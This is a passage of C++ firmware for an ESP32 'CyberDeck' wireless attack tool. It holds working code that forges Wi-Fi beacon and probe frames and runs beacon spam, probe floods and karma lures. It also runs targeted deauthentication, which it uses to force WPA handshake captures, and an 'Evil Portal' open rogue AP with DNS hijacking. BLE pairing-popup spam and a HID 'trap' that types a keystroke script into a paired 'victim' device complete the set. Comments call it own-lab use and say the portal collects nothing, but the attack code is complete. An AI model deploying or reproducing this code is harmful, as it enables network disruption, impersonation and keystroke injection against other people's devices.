  f[n++] = 0x03; f[n++] = 0x01; f[n++] = ch;              // DS param
  esp_wifi_80211_tx(WIFI_IF_STA, f, n, false);
  txTotal++;
}
static void txBeacon()  { txBeaconSsid(FAKE_SSIDS[beaconIdx], channels[chIdx]); beaconIdx = (beaconIdx + 1) % FAKE_N; }
static void txProbe() {
  uint8_t src[6]; randMac(src);
  const char* ssid = FAKE_SSIDS[random(FAKE_N)];
  uint8_t f[96]; int n = 0;
  uint8_t hdr[] = { 0x40,0x00, 0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
  memcpy(f + n, hdr, 10); n += 10;
  memcpy(f + n, src, 6); n += 6;
  f[n++]=0xFF;f[n++]=0xFF;f[n++]=0xFF;f[n++]=0xFF;f[n++]=0xFF;f[n++]=0xFF;   // bssid broadcast
  f[n++] = 0x00; f[n++] = 0x00;
  int sl = strlen(ssid); if (sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl; memcpy(f + n, ssid, sl); n += sl;
  uint8_t rates[] = { 0x01,0x04,0x82,0x84,0x8b,0x96 };
  memcpy(f + n, rates, sizeof(rates)); n += sizeof(rates);
  esp_wifi_80211_tx(WIFI_IF_STA, f, n, false);
  txTotal++;
}
// SAFETY: karma lures only with the chosen target SSID (i.e. your own network's name). Without a
// target it falls back to made-up names (FAKE_SSIDS) — it never re-broadcasts real SSIDs it sniffed
// from nearby clients, so it can't impersonate a neighbour's network by accident.
static void txKarma() {
  if (g_haveTarget && g_tgtSsid[0]) txBeaconSsid(g_tgtSsid, g_tgtCh ? g_tgtCh : channels[chIdx]);
  else                              txBeacon();
}

// ---------------------------------------------------------------------------------------
// Evil Portal  (open rogue SoftAP + DNS hijack + captive REDIRECT to a benign lab notice)
// Demonstrates the rogue-AP / captive-redirect mechanics for own-lab testing. It serves a
// plain "this is a test AP" page and captures NOTHING — no login form, no credentials.
// ---------------------------------------------------------------------------------------
static httpd_handle_t portalHttpd = nullptr;
static esp_netif_t*   apNetif = nullptr;
static volatile bool  portalUp = false;
static volatile int   portalHits = 0;
static TaskHandle_t   portalDnsTask = nullptr;
static const char* PORTAL_SSID = "Free Airport WiFi";
static const char* PORTAL_HTML =
  "<!doctype html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
  "<title>Network Notice</title><style>body{font-family:sans-serif;background:#0a0e12;color:#eee;"
  "text-align:center;padding-top:60px}.c{color:#00e5ff}</style></head><body>"
  "<h2 class=c>CyberDeck Lab AP</h2><p>This is a captive-portal <b>test</b> access point.</p>"
  "<p>Your DNS lookup was intercepted and redirected here.</p>"
  "<p style='color:#888'>No information is collected.</p></body></html>";

static esp_err_t portalGet(httpd_req_t* r) {
  portalHits++;
  httpd_resp_set_type(r, "text/html");
  httpd_resp_send(r, PORTAL_HTML, HTTPD_RESP_USE_STRLEN);
  return ESP_OK;
}
static void portalDnsFn(void*) {                    // answer every DNS query with the AP's own IP
  int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (s < 0) { portalDnsTask = nullptr; vTaskDelete(nullptr); return; }
  struct sockaddr_in a; memset(&a, 0, sizeof(a));
  a.sin_family = AF_INET; a.sin_port = htons(53); a.sin_addr.s_addr = htonl(INADDR_ANY);
  bind(s, (struct sockaddr*)&a, sizeof(a));
  struct timeval tv; tv.tv_sec = 1; tv.tv_usec = 0;
  setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  uint8_t buf[512];
  while (portalUp) {
    struct sockaddr_in cli; socklen_t cl = sizeof(cli);
    int n = recvfrom(s, buf, sizeof(buf), 0, (struct sockaddr*)&cli, &cl);
    if (n < 12) continue;
    buf[2] |= 0x80; buf[3] = 0x80;                  // mark as a (recursion-available) response
    buf[6] = 0; buf[7] = 1;                         // ANCOUNT = 1
    buf[8] = buf[9] = buf[10] = buf[11] = 0;        // NSCOUNT / ARCOUNT = 0
    int len = n;
    uint8_t ans[] = { 0xC0,0x0C, 0,1, 0,1, 0,0,0,0x3C, 0,4, 192,168,4,1 };
    if (len + (int)sizeof(ans) <= (int)sizeof(buf)) { memcpy(buf + len, ans, sizeof(ans)); len += sizeof(ans); }
    sendto(s, buf, len, 0, (struct sockaddr*)&cli, cl);
  }
  close(s);
  portalDnsTask = nullptr;
  vTaskDelete(nullptr);
}
static void portalStart() {
  wifiInitOnce();
  if (!apNetif) apNetif = esp_netif_create_default_wifi_ap();
  esp_wifi_set_mode(WIFI_MODE_AP);
  wifi_config_t ap; memset(&ap, 0, sizeof(ap));
  strncpy((char*)ap.ap.ssid, PORTAL_SSID, sizeof(ap.ap.ssid) - 1);
  ap.ap.ssid_len = strlen(PORTAL_SSID);
  ap.ap.channel = 1; ap.ap.max_connection = 4; ap.ap.authmode = WIFI_AUTH_OPEN;
  esp_wifi_set_config(WIFI_IF_AP, &ap);
  esp_wifi_start();
  portalUp = true; portalHits = 0;
  httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
  hc.lru_purge_enable = true;
  hc.uri_match_fn = httpd_uri_match_wildcard;
  if (httpd_start(&portalHttpd, &hc) == ESP_OK) {
    httpd_uri_t g = { "/*", HTTP_GET, portalGet, nullptr };
    httpd_register_uri_handler(portalHttpd, &g);
  }
  xTaskCreate(portalDnsFn, "pdns", 3072, nullptr, 5, &portalDnsTask);
}
static int portalClients() {
  wifi_sta_list_t list; if (esp_wifi_ap_get_sta_list(&list) == ESP_OK) return list.num;
  return 0;
}
static void portalStop() {
  portalUp = false;
  if (portalHttpd) { httpd_stop(portalHttpd); portalHttpd = nullptr; }
  delay(1100);                                      // let the DNS task hit its recv timeout and exit
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_STA);
}

// ---------------------------------------------------------------------------------------
// Aging + sorting (recon)
// ---------------------------------------------------------------------------------------
static void ageOut() {
  uint32_t now = millis();
  for (int i = 0; i < AP_MAX; i++)  if (apTab[i].used  && now - apTab[i].lastMs  > FORGET_MS) { apTab[i].used  = false; apCount--;  }
  for (int i = 0; i < CLI_MAX; i++) if (cliTab[i].used && now - cliTab[i].lastMs > FORGET_MS) { cliTab[i].used = false; cliCount--; }
}
static int apSorted(int* idx) {   // by RSSI
  int n = 0; for (int i = 0; i < AP_MAX; i++) if (apTab[i].used) idx[n++] = i;
  for (int i = 1; i < n; i++) { int k = idx[i], j = i - 1;
    while (j >= 0 && apTab[idx[j]].rssi < apTab[k].rssi) { idx[j+1] = idx[j]; j--; } idx[j+1] = k; }
  return n;
}
static int cliSorted(int* idx) {  // by PERSISTENCE (longest-following first)
  int n = 0; for (int i = 0; i < CLI_MAX; i++) if (cliTab[i].used) idx[n++] = i;
  for (int i = 1; i < n; i++) { int k = idx[i], j = i - 1;
    uint32_t pk = cliTab[k].lastMs - cliTab[k].firstMs;
    while (j >= 0 && (cliTab[idx[j]].lastMs - cliTab[idx[j]].firstMs) < pk) { idx[j+1] = idx[j]; j--; }
    idx[j+1] = k; }
  return n;
}

// Stream the collected AP table to the app over DATA (one line per AP), so the user can PICK a
// deauth target instead of blasting everything. Line: "bssid<TAB>ch<TAB>rssi<TAB>ssid\n", then "END".
static void sendAplist() {
  if (!bleUp || !phoneConnected || !chData) return;
  int idx[AP_MAX], n = apSorted(idx);
  char line[96];
  for (int r = 0; r < n; r++) {
    const Ap& a = apTab[idx[r]];
    snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X\t%u\t%d\t%s\n",
             a.bssid[0], a.bssid[1], a.bssid[2], a.bssid[3], a.bssid[4], a.bssid[5],
             a.ch, a.rssi, (a.flags & FLAG_HIDDEN) ? "" : a.ssid);
    chData->setValue((const uint8_t*)line, strlen(line)); chData->notify();
    delay(35);
  }
  chData->setValue((const uint8_t*)"END\n", 4); chData->notify();
}

// ---------------------------------------------------------------------------------------
// Per-mode screen composers
// ---------------------------------------------------------------------------------------
static void composePassive() {
  char b[ROW_TEXT_MAX + 1];
  uint32_t now = millis();
  setRow(0, COL_CYAN, "CyberDeck  PASSIVE RECON");
  snprintf(b, sizeof(b), "ch%2u fr%lu cyc%lu AP%d CL%d dx%lu", curCh,
           (unsigned long)framesTotal, (unsigned long)g_cycles, apCount, cliCount,
           (unsigned long)deauthTotal);
  setRow(1, deauthTotal ? COL_RED : COL_GREEN, b);

  setRow(2, COL_YELLOW, "APs  rssi ch enc   ssid");
  int idx[CLI_MAX], n = apSorted(idx);
  for (int r = 0; r < 8; r++) {
    if (r >= n) { setRow(3 + r, COL_GRAY, ""); continue; }
    const Ap& a = apTab[idx[r]];
    snprintf(b, sizeof(b), "%4d %2u %-5s %s", a.rssi, a.ch, encShort(a.enc),
             (a.flags & FLAG_HIDDEN) ? "<hidden>" : a.ssid);
    uint8_t col = a.enc == ENC_OPEN ? COL_RED : (a.enc == ENC_WEP ? COL_ORANGE : COL_GREEN);
    setRow(3 + r, col, b);
  }

  setRow(11, COL_YELLOW, "CLIENTS rssi seen mac    ->/probe");
  n = cliSorted(idx);
  for (int r = 0; r < 8; r++) {
    if (r >= n) { setRow(12 + r, COL_GRAY, ""); continue; }
    const Cli& c = cliTab[idx[r]];
    uint32_t secs = (c.lastMs - c.firstMs) / 1000;
    char tail[20];
    if (c.probeLen)    snprintf(tail, sizeof(tail), "?%s", c.probe);
    else if (c.haveAp) snprintf(tail, sizeof(tail), ">%02x%02x%02x", c.ap[3], c.ap[4], c.ap[5]);
    else               tail[0] = 0;
    snprintf(b, sizeof(b), "%4d %3lus %02x%02x%02x%s %s", c.rssi, (unsigned long)secs,
             c.mac[3], c.mac[4], c.mac[5], (c.flags & FLAG_RANDOM) ? "~" : "", tail);
    uint8_t col = (now - c.lastMs > 20000) ? COL_GRAY : (secs > 60 ? COL_ORANGE : COL_GREEN);
    setRow(12 + r, col, b);
  }
  forceAll = false;
}

static void composeIdle() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  ORCHESTRATOR");
  setRow(1, COL_GREEN, "IDLE - radio free for BLE");
  snprintf(b, sizeof(b), "BLE: %s", phoneConnected ? "phone CONNECTED" : "advertising...");
  setRow(3, phoneConnected ? COL_GREEN : COL_YELLOW, b);
  setRow(4, COL_GRAY, "app/nRF: write CMD opcode");
  setRow(5, COL_GRAY, "BOOT btn = cycle modes");
  snprintf(b, sizeof(b), "uptime %lus", (unsigned long)(millis() / 1000));
  setRow(7, COL_GREEN, b);   // liveness
  forceAll = false;
}

static void composeStub() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  ORCHESTRATOR");
  snprintf(b, sizeof(b), "MODE: %s", MODE_NAME[currentMode]);
  setRow(1, isTxMode(currentMode) ? COL_RED : COL_YELLOW, b);
  setRow(3, COL_YELLOW, "stub - radio logic lands next");
  snprintf(b, sizeof(b), "BLE %s  uptime %lus",
           bleUp ? (phoneConnected ? "conn" : "adv") : "off",
           (unsigned long)(millis() / 1000));
  setRow(5, COL_GREEN, b);
  forceAll = false;
}

static void composeHid() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  BLE HID TRAP");
  snprintf(b, sizeof(b), "bait: %s", HID_BAIT_NAME);
  setRow(1, COL_RED, b);
  snprintf(b, sizeof(b), "script: %s", duckyName(g_duckyScript));
  setRow(3, COL_YELLOW, b);
  const char* st = g_duckyState == 0 ? "waiting for victim..."
                 : g_duckyState == 1 ? "paired - arming..."
                 : g_duckyState == 2 ? "RUNNING SCRIPT" : "DONE";
  setRow(5, g_duckyState >= 1 ? COL_GREEN : COL_GRAY, st);
  setRow(7, COL_GRAY, "press BOOT to exit");
  forceAll = false;
}

static void composeWifiScan() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  WIFI SCAN");
  snprintf(b, sizeof(b), "ch%2u APs:%d frames:%lu", curCh, apCount, (unsigned long)framesTotal);
  setRow(1, COL_GREEN, b);
  setRow(2, COL_YELLOW, "rssi ch enc   ssid");
  int idx[AP_MAX], n = apSorted(idx);
  for (int r = 0; r < 15; r++) {
    if (r >= n) { setRow(3 + r, COL_GRAY, ""); continue; }
    const Ap& a = apTab[idx[r]];
    snprintf(b, sizeof(b), "%4d %2u %-5s %s", a.rssi, a.ch, encShort(a.enc),
             (a.flags & FLAG_HIDDEN) ? "<hidden>" : a.ssid);
    uint8_t col = a.enc == ENC_OPEN ? COL_RED : (a.enc == ENC_WEP ? COL_ORANGE : COL_GREEN);
    setRow(3 + r, col, b);
  }
  forceAll = false;
}

static const char* bleKindTag(uint8_t k) {
  switch (k) { case BK_AIRTAG: return "AirTag"; case BK_FLIPPER: return "Flipper";
               case BK_SKIMMER: return "Skimmer"; default: return "dev"; }
}
static void composeBleList() {
  char b[ROW_TEXT_MAX + 1];
  const char* t = currentMode == AIRTAG_SCAN ? "AIRTAG SCAN"
                : currentMode == FLIPPER_SCAN ? "FLIPPER SCAN"
                : currentMode == SKIMMER_SCAN ? "SKIMMER SCAN" : "BLE SCAN";
  snprintf(b, sizeof(b), "CyberDeck  %s", t);
  setRow(0, COL_CYAN, b);
  snprintf(b, sizeof(b), "adv:%lu shown:%d phone:%s", (unsigned long)bleSeen, bleCount,
           phoneConnected ? "conn" : "adv");
  setRow(1, COL_GREEN, b);
  setRow(2, COL_YELLOW, "rssi kind     name/addr");
  int idx[BLE_MAX], n = 0;
  for (int i = 0; i < BLE_MAX; i++) if (bleTab[i].used) idx[n++] = i;
  for (int i = 1; i < n; i++) { int k = idx[i], j = i - 1;
    while (j >= 0 && bleTab[idx[j]].rssi < bleTab[k].rssi) { idx[j+1] = idx[j]; j--; } idx[j+1] = k; }
  for (int r = 0; r < 15; r++) {
    if (r >= n) { setRow(3 + r, COL_GRAY, ""); continue; }
    const BleDev& d = bleTab[idx[r]];
    snprintf(b, sizeof(b), "%4d %-7s %s", d.rssi, bleKindTag(d.kind), d.name[0] ? d.name : d.key);
    setRow(3 + r, d.kind == BK_PLAIN ? COL_GREEN : COL_RED, b);
  }
  forceAll = false;
}

static void tgtLine(char* b, int n) {
  snprintf(b, n, "tgt %02X%02X%02X%02X%02X%02X ch%u",
    g_tgtBssid[0], g_tgtBssid[1], g_tgtBssid[2], g_tgtBssid[3], g_tgtBssid[4], g_tgtBssid[5], g_tgtCh);
}
static void composeTxAttack() {
  char b[ROW_TEXT_MAX + 1];
  snprintf(b, sizeof(b), "CyberDeck  %s", MODE_NAME[currentMode]);
  setRow(0, COL_CYAN, b);
  if (currentMode == WIFI_DEAUTH && !g_haveTarget) {   // SAFETY: refuse to transmit with no target
    setRow(1, COL_RED, "NO TARGET - NOT transmitting");
    setRow(3, COL_YELLOW, "pick a target in the app");
    setRow(5, COL_GRAY, "STOP (app) or BOOT to exit");
    forceAll = false; return;
  }
  setRow(1, COL_RED, "** TX ACTIVE (own-lab) **");
  if (g_haveTarget && (currentMode == WIFI_DEAUTH || currentMode == KARMA)) {
    tgtLine(b, sizeof(b)); setRow(2, COL_GREEN, b);
    if (g_tgtSsid[0]) { snprintf(b, sizeof(b), "\"%s\"", g_tgtSsid); setRow(3, COL_GREEN, b); }
  }
  snprintf(b, sizeof(b), "ch%2u frames tx:%lu", curCh, (unsigned long)txTotal);
  setRow(5, COL_YELLOW, b);
  setRow(7, COL_GRAY, "STOP (app) or BOOT to exit");
  forceAll = false;
}

static void composeHandshake() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  HANDSHAKE CAP");
  if (g_haveTarget) { tgtLine(b, sizeof(b)); setRow(1, COL_GREEN, b); }
  else                setRow(1, COL_YELLOW, "no target: listening all ch");
  snprintf(b, sizeof(b), "EAPOL:%lu APs:%d ch%2u", (unsigned long)eapolCount, apCount, curCh);
  setRow(3, eapolCount ? COL_GREEN : COL_YELLOW, b);
  if (eapolHave) {
    snprintf(b, sizeof(b), "last %02x%02x%02x%02x%02x%02x",
             eapolBssid[0], eapolBssid[1], eapolBssid[2], eapolBssid[3], eapolBssid[4], eapolBssid[5]);
    setRow(5, COL_GREEN, b);
  } else setRow(5, COL_GRAY, g_haveTarget ? "forcing reauth (deauth)..." : "deauth a client to force");
  setRow(7, COL_GRAY, "STOP (app) or BOOT to exit");
  forceAll = false;
}

static void composeTargetScan() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  TARGET SCAN");
  snprintf(b, sizeof(b), "scanning ch%2u  APs:%d", curCh, apCount);
  setRow(1, COL_YELLOW, b);
  setRow(3, COL_GRAY, "collecting networks ~8s...");
  setRow(5, COL_GRAY, "app reconnects + lists them");
  forceAll = false;
}

static void composePortal() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  EVIL PORTAL");
  snprintf(b, sizeof(b), "SSID: %s", PORTAL_SSID);
  setRow(1, COL_RED, b);
  snprintf(b, sizeof(b), "clients:%d page hits:%d", portalClients(), portalHits);
  setRow(3, COL_GREEN, b);
  setRow(5, COL_GRAY, "open AP + DNS redirect (test)");
  setRow(6, COL_GRAY, "serves notice page only");
  setRow(8, COL_GRAY, "STOP (app) or BOOT to exit");
  forceAll = false;
}

static void composeBleSpam() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  BLE SPAM");
  setRow(1, COL_RED, "** TX: BLE pairing popups **");
  setRow(3, COL_YELLOW, "phone link stays connected");
  snprintf(b, sizeof(b), "uptime %lus", (unsigned long)(millis() / 1000));
  setRow(5, COL_GREEN, b);
  setRow(7, COL_GRAY, "STOP (app) or BOOT to exit");
  forceAll = false;
}

static void composeCurrent() {
  switch (currentMode) {
    case IDLE:              composeIdle();      break;
    case PASSIVE:           composePassive();   break;
    case WIFI_SCAN:         composeWifiScan();  break;
    case WIFI_DEAUTH:
    case BEACON_SPAM:
    case PROBE_FLOOD:
    case KARMA:             composeTxAttack();  break;
    case HANDSHAKE_CAPTURE: composeHandshake(); break;
    case TARGET_SCAN:       composeTargetScan(); break;
    case EVIL_PORTAL:       composePortal();    break;
    case BLE_SCAN:
    case AIRTAG_SCAN:
    case FLIPPER_SCAN:
    case SKIMMER_SCAN:      composeBleList();   break;
    case BLE_SPAM:          composeBleSpam();   break;
    case BLE_HID_TRAP:      composeHid();       break;
    default:                composeStub();      break;
  }
}

static void statusString(char* out, int n) {
  switch (currentMode) {
    case PASSIVE:           snprintf(out, n, "PASSIVE AP%d CL%d dx%lu", apCount, cliCount, (unsigned long)deauthTotal); break;
    case WIFI_SCAN:         snprintf(out, n, "WIFI SCAN APs:%d", apCount); break;
    case WIFI_DEAUTH:       snprintf(out, n, "DEAUTH tgt:%d tx:%lu", apCount, (unsigned long)txTotal); break;
    case BEACON_SPAM:       snprintf(out, n, "BEACON SPAM tx:%lu", (unsigned long)txTotal); break;
    case PROBE_FLOOD:       snprintf(out, n, "PROBE FLOOD tx:%lu", (unsigned long)txTotal); break;
    case KARMA:             snprintf(out, n, "KARMA tx:%lu", (unsigned long)txTotal); break;
    case HANDSHAKE_CAPTURE: snprintf(out, n, "HANDSHAKE EAPOL:%lu", (unsigned long)eapolCount); break;
    case TARGET_SCAN:       snprintf(out, n, "TARGET SCAN APs:%d", apCount); break;
    case EVIL_PORTAL:       snprintf(out, n, "PORTAL cli:%d hits:%d", portalClients(), portalHits); break;
    case BLE_SCAN:          snprintf(out, n, "BLE SCAN found:%d", bleCount); break;
    case AIRTAG_SCAN:       snprintf(out, n, "AIRTAG found:%d", bleCount); break;
    case FLIPPER_SCAN:      snprintf(out, n, "FLIPPER found:%d", bleCount); break;
    case SKIMMER_SCAN:      snprintf(out, n, "SKIMMER found:%d", bleCount); break;
    case BLE_SPAM:          snprintf(out, n, "BLE SPAM active"); break;
    default:                snprintf(out, n, "%s", MODE_NAME[currentMode]); break;
  }
}

// ---------------------------------------------------------------------------------------
// Mode transitions (enter/exit with clean radio handoff)
// ---------------------------------------------------------------------------------------
// Three mutually-exclusive radio roles on the single radio. Crossing roles tears the old one
// down and brings the new one up (the handoff). CONTROL = our BLE GATT; WIFI = promiscuous/TX;
// HID = the BLE HID keyboard trap.
static RadioRole roleOf(Mode m) {
  if (m == BLE_HID_TRAP) return ROLE_HID;
  if (m == TARGET_SCAN)  return ROLE_WIFI;
  if (isWifiMode(m))     return ROLE_WIFI;
  return ROLE_CONTROL;
}

// Within ROLE_CONTROL the phone stays connected; these BLE scanners / spam ride alongside the
// GATT link. Stop whatever was running, then start the one this mode wants.
static void applyControlActivity(Mode m) {
  if (bleScanning) bleScanStop();
  if (bleSpamOn)   bleSpamStop();
  switch (m) {
    case BLE_SCAN:     bleScanStart(BK_PLAIN);   break;
    case AIRTAG_SCAN:  bleScanStart(BK_AIRTAG);  break;
    case FLIPPER_SCAN: bleScanStart(BK_FLIPPER); break;
    case SKIMMER_SCAN: bleScanStart(BK_SKIMMER); break;
    case BLE_SPAM:     bleSpamStart();           break;
    default: break;
  }
}

static void requestMode(Mode next) {
  if (next == currentMode) return;
  RadioRole oldR = roleOf(currentMode), newR = roleOf(next);

  if (oldR != newR) {
    if      (oldR == ROLE_WIFI) { if (currentMode == EVIL_PORTAL) portalStop(); else wifiStop(); }
    else if (oldR == ROLE_HID)  duckyStop();
    else if (oldR == ROLE_CONTROL) { if (bleScanning) bleScanStop(); if (bleSpamOn) bleSpamStop(); bleStop(); }
    delay(50);                                   // let the radio settle before the next role
    if      (newR == ROLE_WIFI) { if (next == EVIL_PORTAL) portalStart(); else wifiStart(); }
    else if (newR == ROLE_HID)  duckyStart(HID_BAIT_NAME);
    else if (newR == ROLE_CONTROL) bleStart();
  }

  currentMode = next;
  if (newR == ROLE_CONTROL) applyControlActivity(next);   // scan/spam sub-activity (phone stays)
  linkClear();
  linkLeds(!isTxMode(currentMode), isTxMode(currentMode));
  composeCurrent();
  char s[ROW_TEXT_MAX + 1]; statusString(s, sizeof(s)); statusNotify(s);
  Serial.printf("[mode] -> %s (ble=%d wifi=%d)\n", MODE_NAME[currentMode], bleUp, promiscOn);
}

// ---------------------------------------------------------------------------------------
static void pollBootButton() {
  static bool last = true;          // pulled up, pressed = LOW
  static uint32_t lastChange = 0;
  bool now = digitalRead(BOOT_BTN);
  if (now != last && millis() - lastChange > 40) {
    lastChange = millis();
    if (now == LOW) { cycleIdx = (cycleIdx + 1) % CYCLE_N; requestMode(CYCLE[cycleIdx]); }
    last = now;
  }
}

void setup() {
  Serial.begin(115200);
  Serial1.begin(LINK_BAUD, SERIAL_8N1, LINK_RX, LINK_TX);
  randomSeed(esp_random());    // vary injected MACs / SSIDs / spam models
  pinMode(BOOT_BTN, INPUT_PULLUP);
  memset(apTab, 0, sizeof(apTab));
  memset(cliTab, 0, sizeof(cliTab));
  for (int i = 0; i < SCREEN_ROWS; i++) { shadow[i][0] = 0; shColor[i] = 0xFF; }

  delay(300);                 // give the UNO time to boot its TFT
  bleStart();                 // boot into IDLE with BLE up, WiFi off
  currentMode = IDLE;
  linkClear();
  linkLeds(true, false);
  composeIdle();
  Serial.println("C3 orchestrator up (IDLE, BLE advertising)");
}

void loop() {
  static uint32_t lastHop = 0, lastSend = 0, lastFull = 0, lastStatus = 0;
  uint32_t now = millis();

  pollBootButton();

  if (pendingOpcode >= 0) {
    int op = pendingOpcode; pendingOpcode = -1;
    Mode m = opcodeToMode((uint8_t)op);
    if (m < MODE_COUNT) requestMode(m);
  }

  // TARGET SCAN auto-returns to IDLE after ~8s (brings BLE back so the app can pull the list).
  static uint32_t tgtScanT0 = 0;
  if (currentMode == TARGET_SCAN) {
    if (tgtScanT0 == 0) tgtScanT0 = now;
    if (now - tgtScanT0 > 8000) { tgtScanT0 = 0; requestMode(IDLE); }
  } else tgtScanT0 = 0;

  // App requested the scanned AP list (opcode 0x23) — send it now that control BLE is up.
  if (g_pendingAplist && bleUp && phoneConnected) { g_pendingAplist = false; sendAplist(); }

  // HID trap: when a host has paired and settled, type the selected script once.
  if (currentMode == BLE_HID_TRAP && duckyVictimReady()) {
    g_duckyState = 2; composeCurrent();    // show RUNNING on the UNO
    duckyRunSelected();                    // blocks while typing
    g_duckyRan = true; g_duckyState = 3; composeCurrent();
  }

  // Channel hop — but a TARGETED handshake capture locks onto the target's channel instead.
  bool lockCh = (currentMode == HANDSHAKE_CAPTURE && g_haveTarget && g_tgtCh);
  if (promiscOn && now - lastHop >= HOP_MS) {
    lastHop = now;
    if (lockCh) { esp_wifi_set_channel(g_tgtCh, WIFI_SECOND_CHAN_NONE); curCh = g_tgtCh; }
    else        hop();
  }

  // WiFi injection (own-lab) — paced per mode while the radio is in WiFi role.
  static uint32_t lastTx = 0;
  if (promiscOn) {
    if      (currentMode == WIFI_DEAUTH && now - lastTx >= 100) { lastTx = now; txDeauthTarget(); }
    else if (currentMode == BEACON_SPAM && now - lastTx >= 25)  { lastTx = now; txBeacon(); }
    else if (currentMode == PROBE_FLOOD && now - lastTx >= 15)  { lastTx = now; txProbe(); }
    else if (currentMode == KARMA       && now - lastTx >= 120) { lastTx = now; txKarma(); }
    else if (currentMode == HANDSHAKE_CAPTURE && g_haveTarget && now - lastTx >= 3000) {
      lastTx = now; txDeauthTarget();   // nudge the target's client to reconnect -> replays handshake
    }
  }
  bleSpamTick();   // no-op unless BLE_SPAM is active

  if (now - lastSend >= SEND_MS) {
    lastSend = now;
    g_cycles++;
    if (promiscOn) ageOut();
    if (now - lastFull >= FULLREFRESH_MS) { forceAll = true; lastFull = now; }
    composeCurrent();
  }

  if (bleUp && phoneConnected && now - lastStatus >= STATUS_MS) {
    lastStatus = now;
    char s[ROW_TEXT_MAX + 1]; statusString(s, sizeof(s)); statusNotify(s);
  }
  delay(3);
}
